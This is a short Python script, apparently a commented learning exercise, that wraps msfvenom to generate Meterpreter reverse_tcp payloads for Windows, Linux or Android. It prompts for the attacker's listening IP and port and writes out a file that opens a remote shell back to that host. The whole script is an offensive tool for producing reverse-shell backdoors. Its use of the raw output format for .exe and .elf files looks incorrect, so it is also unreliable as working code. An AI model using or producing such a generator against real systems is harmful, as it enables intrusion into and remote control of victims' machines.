#import subprocess, normally used to run external commands
#import os, if we need filesystem or OS utilities
#import sys, used to stop the program early 
#with sys.exit(1), when an input is invalid
import subprocess
import os
import sys

#This prints a multiline banner to the console
def banner():
    print("""
    ------------------------------------------
    MSFVENOM PAYLOAD GENERATOR (Python)
    ------------------------------------------
    """)

#This function collects data from the user (IP, and Port)
def get_user_input():
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (your listener port): ").strip()

    # validate port is numeric
    if not lport.isdigit():
        print("LPORT must be a number. Exiting.")
        sys.exit(1)

    #prompt for OS choices and collect a choice at os_choice
    print("Choose target OS:")
    print("1. Windows")
    print("2. Linux")
    print("3. Android")
    os_choice = input("Enter choice (1-3): ").strip()
    
    #connect the key value with the corresponding string
    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_tcp",
        "3": "android/meterpreter/reverse_tcp"
    }
    #connect the key value with the corresponding extension
    extensions = {
        "1": ".exe",
        "2": ".elf",
        "3": ".apk"
    }
    #Validate the choice and return
    if os_choice not in payloads:
        print("Invalid choice. Exiting.")
        sys.exit(1)
    
    #Return chosen values
    return payloads[os_choice], extensions[os_choice], lhost, lport

#This function generates a payload 
def generate_payload(payload, extension, lhost, lport):
    #join the payload with the extension
    filename = f"payload{extension}"
    print(f"\n[+] Generating payload: {filename}")
    
    #Generate the payload
    command = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", filename
]
    #Ask if the payload was generated
    try:
        subprocess.run(command, check=True)
        print(f"[+] Payload saved as: {filename}")
    except subprocess.CalledProcessError:
        print("[-] Payload generation failed.")

def main():
    banner()
    payload, extension, lhost, lport = get_user_input()
    generate_payload(payload, extension, lhost, lport)

if __name__ == "__main__":
    main()